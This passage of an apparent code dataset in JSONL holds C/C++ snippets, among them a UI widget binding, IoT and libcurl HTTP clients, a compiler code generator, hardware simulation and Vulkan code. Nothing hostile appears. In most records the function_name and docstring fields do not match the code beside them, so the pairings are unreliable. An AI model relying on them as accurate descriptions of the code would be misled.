(mesh_opaque_obj != Py_None) {\\n    b->SetMeshOpaque(&PythonClassUIMesh::FromPyObj(mesh_opaque_obj).mesh());\\n  }\\n  if (mesh_transparent_obj != Py_None) {\\n    b->SetMeshTransparent(\\n        &PythonClassUIMesh::FromPyObj(mesh_transparent_obj).mesh());\\n  }\\n  if (draw_controller_obj != Py_None) {\\n    auto* dcw = UIV1Python::GetPyWidget(draw_controller_obj);\\n    if (!dcw) {\\n      throw Exception(\"Invalid or nonexistent draw-controller widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n    b->set_draw_control_parent(dcw);\\n  }\\n  if (has_alpha_channel_obj != Py_None) {\\n    b->set_has_alpha_channel(Python::GetPyBool(has_alpha_channel_obj));\\n  }\\n  if (opacity_obj != Py_None) {\\n    b->set_opacity(Python::GetPyFloat(opacity_obj));\\n  }\\n  if (radial_amount_obj != Py_None) {\\n    b->set_radial_amount(Python::GetPyFloat(radial_amount_obj));\\n  }\\n  if (pos_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(pos_obj);\\n    b->set_translate(p.x, p.y);\\n  }\\n  if (transition_delay_obj != Py_None) {\\n    \/\/ We accept this as seconds; widget takes milliseconds.\\n    b->set_transition_delay(1000.0f * Python::GetPyFloat(transition_delay_obj));\\n  }\\n  if (color_obj != Py_None) {\\n    std::vector<float> c = Python::GetPyFloats(color_obj);\\n    if (c.size() != 3) {\\n      throw Exception(\"Expected 3 floats for color.\", PyExcType::kValue);\\n    }\\n    b->set_color(c[0], c[1], c[2]);\\n  }\\n  if (tint_color_obj != Py_None) {\\n    std::vector<float> c = Python::GetPyFloats(tint_color_obj);\\n    if (c.size() != 3) {\\n      throw Exception(\"Expected 3 floats for tint_color.\", PyExcType::kValue);\\n    }\\n    b->set_tint_color(c[0], c[1], c[2]);\\n  }\\n  if (tint2_color_obj != Py_None) {\\n    std::vector<float> c = Python::GetPyFloats(tint2_color_obj);\\n    if (c.size() != 3) {\\n      throw Exception(\"Expected 3 floats for tint2_color.\", PyExcType::kValue);\\n    }\\n    b->set_tint2_color(c[0], c[1], c[2]);\\n  }\\n  if (tilt_scale_obj != Py_None) {\\n    b->set_tilt_scale(Python::GetPyFloat(tilt_scale_obj));\\n  }\\n\\n  \/\/ if making a new widget add it at the end\\n  if (edit_obj == Py_None) {\\n    g_ui_v1->AddWidget(b.Get(), parent_widget);\\n  }\\n\\n  return b->NewPyRef();\\n  BA_PYTHON_CATCH;\\n}'}","id":3392}
{"content":"{'function_name': 'CreateHTree', 'docstring': '\/\/\u4e0d\u4f7f\u75280\u53f7\u5355\u5143', 'code': 'int main()\\n{\\n  \/*BiTree T;\\n   CreateBiTree(T);\\n   cout<<\"\u4e2d\u5e8f\"<<endl;\\n   InOrderTraverse(T);\\n    cout<<\"\u524d\u5e8f\"<<endl;\\n   FrontTraverse(T);\\n    cout<<\"\u540e\u5e8f\"<<endl;\\n   RearTraverse(T);\\ncout<<\"\u5c42\u5e8f\"<<endl;\\n   levelTree(T);\\n\\n   cout<<endl;\\n  cout<<\"\u6df1\u5ea6\"<<Depth(T)<<endl;\\ncout<<\"\u8282\u70b9\u6570\"<<CountNode(T)<<endl;*\/\\n\\n\\nHTree h;\\nCreateHTree(h,4);\\nfor(int i=1 ;i<=7;i++){\\n    cout<<h[i].weight<<\"   \";\\n}\\n\\n\\n\\n    return 0;\\n}'}","id":3397}
{"content":"{'function_name': 'parse_poll_response', 'docstring': '\/\/ Make sure we have some data coming', 'code': 'int sp_sense_poll (uint32_t feed_id, char *output, boolean is_device)\\n{\\n  uint32_t s;\\n  int res;\\n\\n  \/\/ Sanity check\\n  if (!feed_id || !output)\\n    return -SENSE_ERR_PARAMETER;\\n\\n  \/\/ Establish connection to sen.se\\n  if ((s = sp_sense_connect()) < 0) {\\n    PRINT (F(\"Failed to connect to Sen.se !\"));\\n    return s;\\n  }\\n\\n  PRINTLN (F(\"POLL: Sending http headers !\"));\\n  if (is_device)\\n    sp_send (s, F(\"GET \/devices\/\"));\\n  else {\\n    sp_send (s, F(\"GET \/feeds\/\"));\\n  }\\n\\n  sp_send (s, feed_id);\\n  sp_send (s, F(\"\/last_event\/?sense_key=\"));\\n  sp_send (s, sense_key);\\n  sp_send (s, F(\" HTTP\/1.1\\\\n\"));\\n  sp_send (s, F(\"Host: api.sen.se\\\\n\"));\\n  sp_send (s, F(\"Content-Type: application\/json\\\\r\\\\n\"));\\n  sp_send (s, F(\"Content-Length: 0\\\\r\\\\n\"));\\n  sp_send (s, F(\"Connection: Keep-Alive\"));\\n  sp_send (s, F(\"\\\\r\\\\n\\\\r\\\\n\"));\\n\\n  PRINTLN (F(\"Reading http headers !\"));\\n  if ((res = read_http_headers(s)) < 0) {\\n    PRINT (F(\"Error \"));\\n    PRINT (res);\\n    PRINTLN (F(\" occurred, terminating sen.se communication !\"));\\n    closesocket(s);\\n    return res;\\n  }\\n\\n  res = parse_poll_response (s, output);\\n\\n  PRINTLN (F(\"Closing socket and leaving !\"));\\n  closesocket(s);\\n\\n  return res;\\n}'}","id":3408}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ packomat', 'code': 'int PWM2deg(int pwmsig)\\n{\\n  \/\/Convertir les signaux PWM en angles\\n  \/\/1100\/1500\/1900\\n  \/\/->\\n  \/\/0\/90\/180\\n  float tmp = pwmsig-1100.0;\\n  if (tmp<0){\\n    tmp=0;\\n  };\\n  if (tmp>800){\\n    tmp=800;\\n  };\\n  int res = (tmp\/800.0)*180.0;\\n  return res;\\n}'}","id":3416}
{"content":"{'function_name': 'denoiseb_rd45_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd46_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd46 read pattern: { denoiseb_update_0[d0, d1] -> raw[3 + 2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2895 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (1934 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_2895();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3417}
{"content":"{'function_name': 'DCCDisp_RegBinReg', 'docstring': '\/* Special optimizations for binary operation on the same register. *\/', 'code': 'PUBLIC void\\nDCCDisp_CstBinReg(tok_t op, struct DCCSymAddr const *__restrict val,\\n                  rc_t dst, int src_unsigned) {\\n struct binary_operator const *bin_op = bin_ops; rc_t temp;\\n while (bin_op->bo_tok && bin_op->bo_tok != op) ++bin_op;\\n if (!bin_op->bo_tok) {\\n  switch (op) {\\n  case \\'=\\': DCCDisp_CstMovReg(val,dst); break;\\n  {\\n  case \\'*\\':\\n   if (dst&(DCC_RC_I32|DCC_RC_I16)) {\\n    DCCDisp_ProbeSym(val,1);\\n    \/* 16\/32-bit mul. *\/\\n    if (!(dst&DCC_RC_I32)) t_putb(0x66);\\n    if (!val->sa_sym && val->sa_off == (int8_t)val->sa_off) {\\n     \/* imul $imm8, %r16\/32 *\/\\n     t_putb(0x6b);\\n     dst &= ~(DCC_RC_I3264|DCC_RC_I16);\\n    } else {\\n     \/* imul $imm16\/32, %r16\/32 *\/\\n     t_putb(0x69);\\n    }\\n    asm_modreg(dst&DCC_RI_MASK,dst&DCC_RI_MASK);\\n    goto put_expr;\\n   }\\n   \/* 8-bit mul w\/ immediate value. *\/\\n   temp = DCCVStack_GetReg(DCC_RC_I16,0);\\n   assertf(temp&DCC_RC_I8,\"Must always be the case for non-pointer classes.\");\\n   DCCDisp_RegMovReg(dst,temp,1);\\n   \/* imulw $symaddr, %temp *\/\\n   DCCDisp_CstBinReg(\\'*\\',val,temp,src_unsigned);\\n   \/* Store the multiplication result. *\/\\n   DCCDisp_RegMovReg(temp,dst,1);\\n  } break;\\n\\n  { \/* Divide\/Modulo *\/\\n   rc_t temp;\\n  case \\'\/\\':\\n  case \\'%\\':\\n   \/* Allocate a temporary register for the source constant.\\n    * NOTE: Make sure not to allocate the destination register,\\n    *       or the fixed registers that will be required for the opcode.\\n    *\/\\n#ifdef IA32_PROTECTED_REGISTERS\\n   if ((dst&DCC_RI_MASK) == DCC_ASMREG_ECX) {\\n    \/* Since \\'EBX\\' is protected, ECX is the only register we could use.\\n     * But as it turns out, that one\\'s already in use by the destination.\\n     * >> Now we have to push\/pop EBX... *\/\\n    temp = (dst&DCC_RC_MASK)|DCC_ASMREG_EBX;\\n    DCCDisp_RegPush(temp);\\n    DCCDisp_CstMovReg(val,temp);\\n    DCCDisp_RegBinReg(op,temp,dst,src_unsigned);\\n    DCCDisp_PopReg(temp);\\n   } else\\n#endif\\n   {\\n    temp = DCCVStack_GetRegOf(dst&DCC_RC_MASK,\\n                            ~((1 << DCC_ASMREG_EAX)|\\n                              (1 << DCC_ASMREG_EDX)|\\n                              (1 << (dst&DCC_RI_MASK))));\\n    DCCDisp_CstMovReg(val,temp);\\n    DCCDisp_RegBinReg(op,temp,dst,src_unsigned);\\n   }\\n   break;\\n  }\\n\\n  { \/* Shift operations. *\/\\n  case TOK_SHL:\\n  case TOK_SHR:\\n  case TOK_RANGLE3:\\n   DCCDisp_ProbeSym(val,1);\\n   \/* Generate the shift instruction. *\/\\n   if ((dst&(DCC_RC_I16|DCC_RC_I3264)) == DCC_RC_I16) t_putb(0x66);\\n   if (!val->sa_sym && val->sa_off == 1) {\\n    \/* Shift by 1. *\/\\n    t_putb(0xd0+!!(dst&DCC_RC_I16));\\n    asm_modreg(get_shift_group(op),dst&DCC_RI_MASK);\\n   } else {\\n    t_putb(0xc0+!!(dst&DCC_RC_I16));\\n    asm_modreg(get_shift_group(op),dst&DCC_RI_MASK);\\n    DCCDisp_SymAddr8(val);\\n   }\\n  } break;\\n\\n  { \/* test *\/\\n  case \\'t\\':\\n   DCCDisp_ProbeSym(val,1);\\n   if ((dst&(DCC_RC_I16|DCC_RC_I3264)) == DCC_RC_I16) t_putb(0x66);\\n   if ((dst&DCC_RI_MASK) == DCC_ASMREG_EAX) {\\n    t_putb(0xa8+!!(dst&DCC_RC_I16));\\n   } else {\\n    t_putb(0xf6+!!(dst&DCC_RC_I16));\\n    asm_modreg(0,dst&DCC_RI_MASK);\\n   }\\n        if (dst&DCC_RC_I3264) DCCDisp_SymAddr32(val);\\n   else if (dst&DCC_RC_I16)   DCCDisp_SymAddr16(val);\\n   else                       DCCDisp_SymAddr8 (val);\\n  } break;\\n\\n  default: break;\\n  }\\n  return;\\n }\\n \/* *op symaddr, %reg *\/\\n DCCDisp_ProbeSym(val,1);\\n if ((dst&(DCC_RC_I16|DCC_RC_I3264)) == DCC_RC_I16) t_putb(0x66);\\n if ((dst&DCC_RI_MASK) == DCC_ASMREG_EAX) {\\n  t_putb(bin_op->bo_r_rm8+4+!!(dst&DCC_RC_I16));\\n } else {\\n  if (!(dst&(DCC_RC_I16|DCC_RC_I3264))) {\\n   t_putb(0x80); \/* 8-bit immediate value. *\/\\n  } else if (!val->sa_sym && val->sa_off == (int8_t)val->sa_off) {\\n   \/* 7-bit immediate value. *\/\\n   t_putb(0x83);\\n   dst &= ~(DCC_RC_I16|DCC_RC_I3264);\\n  } else {\\n   \/* 16\/32-bit immediate value. *\/\\n   t_putb(0x81);\\n  }\\n  asm_modreg(bin_op->bo_im_grp,dst&DCC_RI_MASK);\\n }\\nput_expr:\\n#ifdef DCC_RC_I64\\n      if (dst&DCC_RC_I64) DCCDisp_SymAddr64(val);\\n else\\n#endif\\n      if (dst&DCC_RC_I32) DCCDisp_SymAddr32(val);\\n else if (dst&DCC_RC_I16) DCCDisp_SymAddr16(val);\\n else                     DCCDisp_SymAddr8(val);\\n}'}","id":3420}
{"content":"{'function_name': 'CURL_Init', 'docstring': '\/\/ will be grown as needed by realloc above\\r', 'code': 'static int CURL_Set(int r7Sn, int functionSn) {\\r\\n\\t\\tint result = 1;\\r\\n\\t\\tvoid *variableObject = NULL;\\r\\n\\t\\tresult = R7_GetVariableObject(r7Sn, functionSn, 2, &variableObject);\\r\\n\\t\\tif (result <= 0) {\\r\\n\\t\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, -1);\\r\\n\\t\\t\\treturn -1;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tCURL_t *curl = ((CURL_t*)variableObject);\\r\\n\\r\\n\\t\\tchar url[R7_STRING_SIZE];\\r\\n\\t\\tR7_GetVariableString(r7Sn, functionSn, 3, url, R7_STRING_SIZE);\\r\\n\\r\\n\\t\\tint TimeOut = 10;\\r\\n\\t\\tR7_GetVariableInt(r7Sn, functionSn, 4, &TimeOut);\\r\\n\\n\\t\\tcurl_easy_setopt(curl->curl, CURLOPT_URL, url);\\n\\t\\tcurl_easy_setopt(curl->curl, CURLOPT_TIMEOUT, TimeOut);\\n\\t\\tcurl_easy_setopt(curl->curl, CURLOPT_CONNECTTIMEOUT, TimeOut);\\r\\n\\n\\t\\t\/\/Send all data to this function.\\n\\t\\tcurl_easy_setopt(curl->curl, CURLOPT_WRITEFUNCTION, curl_WriteMemoryCallback);\\n\\n\\t\\t\/\/We pass our \\'chunk\\' struct to the callback function.\\n\\t\\tcurl_easy_setopt(curl->curl, CURLOPT_WRITEDATA, (void*)&curl->chunk);\\n\\n\\t\\t\/\/Some servers don\\'t like requests that are made without a user-agent field, so we provide one.\\n\\t\\tcurl_easy_setopt(curl->curl, CURLOPT_USERAGENT, \"libcurl-agent\/1.0\");\\r\\n\\r\\n\\t\\tR7_SetVariableInt(r7Sn, functionSn, 1, result);\\r\\n\\t\\tR7_SetVariableObject(r7Sn, functionSn, 2, curl);\\r\\n\\t\\treturn 1;\\r\\n\\t}'}","id":3423}
{"content":"{'function_name': 'stopAlarm', 'docstring': '\/\/ disable Alarm', 'code': 'void updatePerMin(unsigned long timeNow) {\\n  if (WiFi.status() != WL_CONNECTED) {\\n    Serial.println(\"WiFi Disconnected\");\\n    connectToWifi();\\n    return;\\n  }\\n\\n  std::string timeString = httpGetRequest(\"http:\/\/alarm-clock.braun-oliver.de\/getTime.php\");\\n  std::string settingsString = httpGetRequest(\"http:\/\/alarm-clock.braun-oliver.de\/settings.txt\");\\n\\n  if (timeString == \"\" || settingsString == \"\")\\n    return;\\n\\n  std::vector<std::string> timeTokens = split(timeString, \\' \\');\\n  std::vector<std::string> settingTokens = split(settingsString, \\'\\\\n\\');\\n\\n  int h = atoi(timeTokens[0].c_str());\\n  int m = atoi(timeTokens[1].c_str());\\n  int s = atoi(timeTokens[2].c_str());\\n\\n  timeFromServer = h * 100 + m;\\n  updateScreen = true;\\n\\n  \/\/ Adjust lastTime based on s passed since full m\\n  lastTime = timeNow - ((s * 1000));\\n\\n  Serial.printf(\"H %i, m %i, s %i\\\\n\", h, m, s);\\n\\n  for (const std::string& token : settingTokens) {\\n    std::vector<std::string> nameValuePair = split(token, \\':\\');\\n\\n    if (nameValuePair.size() != 2) {\\n      Serial.printf(\"Could not evaluate %s\\\\n\", token.c_str());\\n      continue;\\n    }\\n\\n    const std::string& name = nameValuePair[0];\\n    const std::string& value = nameValuePair[1];\\n\\n    if (name == \"Hour\")\\n      alarmH = atoi(value.c_str());\\n    else if (name == \"Minute\")\\n      alarmM = atoi(value.c_str());\\n    else if (name == \"SnoozeTime\")\\n      snoozeTime = atoi(value.c_str());\\n    else if (name == \"SoundPath\") {\\n      if (lastSoundfilePath != value) {\\n        lastSoundfilePath = value;\\n        loadAudio(lastSoundfilePath);\\n      }\\n    }\\n    else if (name == \"DarkMode\")\\n      darkMode = (bool)atoi(value.c_str());\\n    else if (name == \"ScreenOff\")\\n      screenOff = (bool)atoi(value.c_str());\\n  }\\n\\n  if ((alarmH == h && alarmM == m) || (snoozeH == h && snoozeM == m))\\n    startAlarm();\\n\\n  \/\/ If alarm has been going for more than 10 min, shut off\\n  if (alarmRunningTooLong(h, m)) {\\n    Serial.println(\"Alarm has been running too long, stopping!\");\\n    stopAlarm(true);\\n  }\\n}'}","id":3425}
{"content":"{'function_name': 'BuildGraph', 'docstring': '\/* \u5982\u679c\u9876\u70b9\u6709\u6570\u636e\u7684\u8bdd\uff0c\u8bfb\u5165\u6570\u636e *\/', 'code': 'bool IsEdge(MGraph Graph, Vertex V, Vertex W) {\\n\\t\/*\\n\\t\u68c0\u67e5<V,W>\u662f\u5426\u662f\u56fe\u4e2d\u7684\u4e00\u6761\u8fb9\uff0c\u5373W\u662f\u5426\u662fV\u7684\u90bb\u63a5\u70b9\\n\\t*\/\\n\\treturn (Graph->G[V][W]<INFINITY ? true : false);\\n}'}","id":3433}
{"content":"{'function_name': 'core__load_binary', 'docstring': '\/\/  process_llvm_stackmaps();', 'code': 'CL_DEFUN T_mv core__dlload(T_sp pathDesig) {\\n  string lib_extension;\\n#ifdef _TARGET_OS_DARWIN\\n  lib_extension = \".dylib\";\\n#endif\\n#if defined( _TARGET_OS_LINUX) || defined( _TARGET_OS_FREEBSD)\\n  lib_extension = \".so\";\\n#endif\\n  int mode = RTLD_NOW | RTLD_GLOBAL;\\n  Path_sp path = coerce::pathDesignator(pathDesig);\\n  Path_sp pathWithProperExtension = path->replaceExtension(lib_extension);\\n  string ts = pathWithProperExtension->asString();\\n  printf(\"%s:%d Loading with core__dlload %s\\\\n\", __FILE__, __LINE__, ts.c_str());\\n  void *handle = dlopen(ts.c_str(), mode);\\n  if (handle == NULL) {\\n    string error = dlerror();\\n    return (Values(_Nil<T_O>(), SimpleBaseString_O::make(error)));\\n  }\\n  string stem = path->stem();\\n  size_t dsp = 0;\\n  if ((dsp = stem.find(\"_d\")) != string::npos) {\\n    stem = stem.substr(0, dsp);\\n  }\\n  stringstream ss;\\n  ss << \"___kernel_\" << stem;\\n  string initName;\\n  string kernelInitName = ss.str();\\n  initName = kernelInitName;\\n  InitFnPtr mainFunctionPointer = (InitFnPtr)dlsym(handle, kernelInitName.c_str());\\n  if (mainFunctionPointer == NULL) {\\n    ss.str(\"\");\\n    ss << \"___user_\" << stem;\\n    string userInitName = ss.str();\\n    initName = userInitName;\\n    mainFunctionPointer = (InitFnPtr)dlsym(handle, userInitName.c_str());\\n    if (mainFunctionPointer == NULL) {\\n      SIMPLE_ERROR(BF(\"Could not find initialization function %s or %s\") % kernelInitName % userInitName);\\n    }\\n  }\\n  \/\/\\tprintf(\"Found function %s at address %p\\\\n\", initName.c_str(), mainFunctionPointer);\\n  T_mv result;\\n  ActivationFrame_sp frame = _Nil<ActivationFrame_O>();\\n  (*mainFunctionPointer)();\\n  return (Values(Pointer_O::create(handle), _Nil<T_O>()));\\n}'}","id":3438}
{"content":"{'function_name': 'Venus_GetSystemTick', 'docstring': '\/*if( g_pFuction != NULL && g_pFuction->pfGetSystemTick != NULL )\\r\\n\\t{\\r\\n\\t\\treturn g_pFuction->pfGetSystemTick();\\r\\n\\t}*\/', 'code': 'HRESULT CreateTracker_Video(ITracker** ppTracker, int iVideoID\/* = 0*\/)\\r\\n{\\r\\n\\tif (ppTracker == NULL)\\r\\n\\t{\\r\\n\\t\\treturn E_POINTER;\\r\\n\\t}\\r\\n\\r\\n\\tCTrackerImpl *pTrackerImpl = new CTrackerImpl();\\r\\n\\r\\n\\tif (pTrackerImpl == NULL)\\r\\n\\t{\\r\\n\\t\\treturn E_OUTOFMEMORY;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/\u521b\u5efa\u5404\u529f\u80fd\u7ec4\u4ef6\\r\\n\\tRTN_HR_IF_FAILED(pTrackerImpl->OnCreate());\\r\\n\\r\\n\\t\/\/ final assignment\\r\\n\\t*ppTracker=pTrackerImpl;\\r\\n\\r\\n\\treturn S_OK;\\r\\n}'}","id":3439}
{"content":"{'function_name': 'microsecondsToInches', 'docstring': '\/\/ Ver: http:\/\/www.parallax.com\/dl\/docs\/prod\/acc\/28015-PING-v1.3.pdf', 'code': 'long microsecondsToCentimeters(long microseconds)\\n{\\n  \/\/ La velocidad del sonido es de 340 m \/ s o 29 microsegundos por centimetro.\\n  \/\/ La mesa de ping viaja de ida y vuelta, por lo que para encontrar la distancia del\\n  \/\/ Object tomamos la mitad de la distancia recorrida.\\n  return microseconds \/ 2.9 \/ 2;\\n}'}","id":3448}
{"content":"{'function_name': 'NeuroSimSubArrayReadEnergy', 'docstring': '\/\/ Skip this function if param->NeuroSimDynamicPerformance is false', 'code': \"double NeuroSimSubArrayWriteEnergy(SubArray *subArray, int numWriteOperationPerRow, double numWriteCellPerOperation) {\\t\/\/ For 1 weight update task of one row\\n\\tif (!param->NeuroSimDynamicPerformance) { return 0; }\\t\/\/ Skip this function if param->NeuroSimDynamicPerformance is false\\n\\tsubArray->activityRowWrite = 1;\\n\\tsubArray->activityColWrite = 1;\\n\\tif (subArray->cell.memCellType == Type::SRAM) {   \/\/ SRAM\\n\\t\\tsubArray->wlDecoder.CalculatePower(1, 1);\\t\/\/ Don't care read, should be different for parallel read\\n\\t\\tsubArray->precharger.CalculatePower(1, numWriteOperationPerRow);\\t\/\/ Don't care read\\n\\t\\tsubArray->sramWriteDriver.CalculatePower(numWriteOperationPerRow);\\n\\n\\t\\treturn\\tsubArray->wlDecoder.writeDynamicEnergy +\\n\\t\\t\\t\\tsubArray->precharger.writeDynamicEnergy +\\n\\t\\t\\t\\tsubArray->sramWriteDriver.writeDynamicEnergy;\\n\\n\\t} \\n    else {    \/\/ eNVM\\n\\t\\tif (subArray->digitalModeNeuro) {   \/\/ Digital eNVM\\n\\t\\t\\tif (subArray->cell.accessType == CMOS_access) {   \/\/ 1T1R\\n                 if(subArray->parallelRead==true)\\n                 {  \/\/parallel readout\\n                      subArray->wlBlSwitchMatrix.CalculatePower(1,1);\\n                      subArray->slSwitchMatrix.CalculatePower(1, numWriteOperationPerRow);\\t\/\/ Don't care read\\n                                    \\n                      return subArray->wlBlSwitchMatrix.writeDynamicEnergy+\\n                             subArray->slSwitchMatrix.writeDynamicEnergy;\\n            \\n                  }\\n                  else\\n                  {\\n                      subArray->wlDecoder.CalculatePower(1, 1);\\t\/\/ Don't care read\\n                      subArray->colDecoder.CalculatePower(1, numWriteOperationPerRow);  \/\/ Doesn't matter for read\\n                      subArray->colDecoderDriver.CalculatePower(1, numWriteCellPerOperation, 1, numWriteOperationPerRow * 2); \/\/ Doesn't matter for read. *2 means 2-step write\\n                      return\\tsubArray->wlDecoder.writeDynamicEnergy +\\n                                subArray->colDecoder.writeDynamicEnergy +\\n                                subArray->colDecoderDriver.writeDynamicEnergy;\\n                  }\\n\\t\\t\\t} else {    \/\/ Cross-point\\n\\t\\t\\t\\tsubArray->wlDecoder.CalculatePower(1, 1);\\t\/\/ Don't care read\\n\\t\\t\\t\\tsubArray->wlDecoderDriver.CalculatePower(1, numWriteCellPerOperation, 1, numWriteOperationPerRow);\\n\\t\\t\\t\\tsubArray->colDecoder.CalculatePower(1, numWriteOperationPerRow);  \/\/ Doesn't matter for read\\n\\t\\t\\t\\tsubArray->colDecoderDriver.CalculatePower(1, numWriteCellPerOperation, 1, numWriteOperationPerRow * 2); \/\/ Doesn't matter for read. *2 means 2-step write\\n\\t\\t\\t\\treturn\\tsubArray->wlDecoder.writeDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->wlDecoderDriver.writeDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->colDecoder.writeDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->colDecoderDriver.writeDynamicEnergy;\\n\\t\\t\\t}\\n\\t\\t} else {    \/\/ Analog eNVM\\n\\t\\t\\tif (subArray->cell.accessType == CMOS_access) {   \/\/ 1T1R\\n\\t\\t\\t\\tsubArray->blSwitchMatrix.numWritePulse = 1;\\t\/\/ Does not matter\\n\\t\\t\\t\\tsubArray->slSwitchMatrix.numWritePulse = subArray->numWritePulse;\\n\\t\\t\\t\\tsubArray->wlDecoder.CalculatePower(1, 1);\\t\/\/ Don't care read\\n\\t\\t\\t\\tsubArray->wlDecoderOutput.CalculatePower(1, 1);\\t\/\/ Don't care read\\n\\t\\t\\t\\tsubArray->blSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don't care read\\n\\t\\t\\t\\tsubArray->slSwitchMatrix.CalculatePower(1, numWriteOperationPerRow);\\t\/\/ Don't care read\\n\\t\\t\\t\\treturn \\tsubArray->wlDecoder.writeDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->wlDecoderOutput.writeDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->blSwitchMatrix.writeDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->slSwitchMatrix.writeDynamicEnergy;\\n\\t\\t\\t} else {    \/\/ Cross-point\\n\\t\\t\\t\\tsubArray->wlSwitchMatrix.numWritePulse = subArray->numWritePulse;\\n\\t\\t\\t\\tsubArray->blSwitchMatrix.numWritePulse = subArray->numWritePulse;\\n\\t\\t\\t\\tsubArray->wlSwitchMatrix.CalculatePower(1, 1);\\t\/\/ Don't care read\\n\\t\\t\\t\\tsubArray->blSwitchMatrix.CalculatePower(1, numWriteOperationPerRow);\\t\/\/ Don't care read\\n\\t\\t\\t\\treturn  subArray->wlSwitchMatrix.writeDynamicEnergy +\\n\\t\\t\\t\\t\\t\\tsubArray->blSwitchMatrix.writeDynamicEnergy;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n}\"}","id":3449}
{"content":"{'function_name': 'VkToPalMemoryImageCopyRegion', 'docstring': '\/\/ Convert pitch to bytes per pixel and multiply depth pitch by row pitch after the texel-to-block conversion', 'code': 'inline Pal::HwPipePoint VkToPalSrcPipePoint(\\n    PipelineStageFlags flags)\\n{\\n    \/\/ Flags that only require signaling at top-of-pipe.\\n    static const PipelineStageFlags srcTopOfPipeFlags =\\n        VK_PIPELINE_STAGE_HOST_BIT                           |\\n        VK_PIPELINE_STAGE_TOP_OF_PIPE_BIT;\\n\\n    \/\/ Flags that only require signaling post-index-fetch.\\n    static const PipelineStageFlags srcPostIndexFetchFlags =\\n        srcTopOfPipeFlags                                    |\\n        VK_PIPELINE_STAGE_DRAW_INDIRECT_BIT                  |\\n        VK_PIPELINE_STAGE_2_INDEX_INPUT_BIT_KHR              |\\n        VK_PIPELINE_STAGE_CONDITIONAL_RENDERING_BIT_EXT;\\n\\n    \/\/ Flags that only require signaling pre-rasterization.\\n    static const PipelineStageFlags srcPreRasterizationFlags =\\n        srcPostIndexFetchFlags                               |\\n        VK_PIPELINE_STAGE_VERTEX_INPUT_BIT                   |\\n        VK_PIPELINE_STAGE_VERTEX_SHADER_BIT                  |\\n        VK_PIPELINE_STAGE_TESSELLATION_CONTROL_SHADER_BIT    |\\n        VK_PIPELINE_STAGE_TESSELLATION_EVALUATION_SHADER_BIT |\\n        VK_PIPELINE_STAGE_2_VERTEX_ATTRIBUTE_INPUT_BIT_KHR   |\\n        VK_PIPELINE_STAGE_GEOMETRY_SHADER_BIT                |\\n        VK_PIPELINE_STAGE_TRANSFORM_FEEDBACK_BIT_EXT         |\\n        VK_PIPELINE_STAGE_2_PRE_RASTERIZATION_SHADERS_BIT_KHR;\\n\\n    \/\/ Flags that only require signaling post-PS.\\n    static const PipelineStageFlags srcPostPsFlags =\\n        srcPreRasterizationFlags                             |\\n        VK_PIPELINE_STAGE_EARLY_FRAGMENT_TESTS_BIT           |\\n        VK_PIPELINE_STAGE_FRAGMENT_SHADER_BIT                |\\n        VK_PIPELINE_STAGE_FRAGMENT_SHADING_RATE_ATTACHMENT_BIT_KHR;\\n\\n    \/\/ Flags that only require signaling post-CS.\\n    static const PipelineStageFlags srcPostCsFlags =\\n#if VKI_RAY_TRACING\\n        VK_PIPELINE_STAGE_RAY_TRACING_SHADER_BIT_KHR           |\\n        VK_PIPELINE_STAGE_ACCELERATION_STRUCTURE_BUILD_BIT_KHR |\\n#endif\\n        VK_PIPELINE_STAGE_COMPUTE_SHADER_BIT;\\n\\n    \/\/ Flags that only require signaling post-BLT operations.\\n    static const PipelineStageFlags srcPostBltFlags =\\n        VK_PIPELINE_STAGE_2_COPY_BIT_KHR                     |\\n        VK_PIPELINE_STAGE_2_RESOLVE_BIT_KHR                  |\\n        VK_PIPELINE_STAGE_2_BLIT_BIT_KHR                     |\\n        VK_PIPELINE_STAGE_2_CLEAR_BIT_KHR                    |\\n        VK_PIPELINE_STAGE_TRANSFER_BIT;\\n\\n    Pal::HwPipePoint srcPipePoint;\\n\\n    \/\/ Check if top-of-pipe signaling is enough.\\n    if ((flags & ~srcTopOfPipeFlags) == 0)\\n    {\\n        srcPipePoint = Pal::HwPipeTop;\\n    }\\n    \/\/ Otherwise see if post-index-fetch signaling is enough.\\n    else if ((flags & ~srcPostIndexFetchFlags) == 0)\\n    {\\n        srcPipePoint = Pal::HwPipePostPrefetch;\\n    }\\n    \/\/ Otherwise see if pre-rasterization signaling is enough.\\n    else if ((flags & ~srcPreRasterizationFlags) == 0)\\n    {\\n        srcPipePoint = Pal::HwPipePreRasterization;\\n    }\\n    \/\/ Otherwise see if post-PS signaling is enough.\\n    else if ((flags & 